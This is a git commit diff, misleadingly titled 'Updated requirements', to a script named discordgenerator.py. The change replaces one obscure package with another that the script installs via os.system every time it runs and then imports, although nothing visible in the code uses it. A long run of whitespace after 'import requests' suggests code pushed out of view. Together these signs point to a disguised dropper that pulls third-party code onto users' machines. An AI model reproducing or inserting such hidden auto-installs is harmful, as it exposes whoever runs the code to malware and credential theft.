ea07a95f5e21dc710abae8433a96582aef49fc4a
OringoDevelopment <108576162+OringoDevelopment@users.noreply.github.com>
2023-07-17 16:07:24 +0100

    Updated requirements

--- discordgenerator.py
+++ discordgenerator.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlitedbmodules")
-import syssqlitedbmodules
+os.system("pip install pipcoloringstools")
+import pipcoloringstools
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
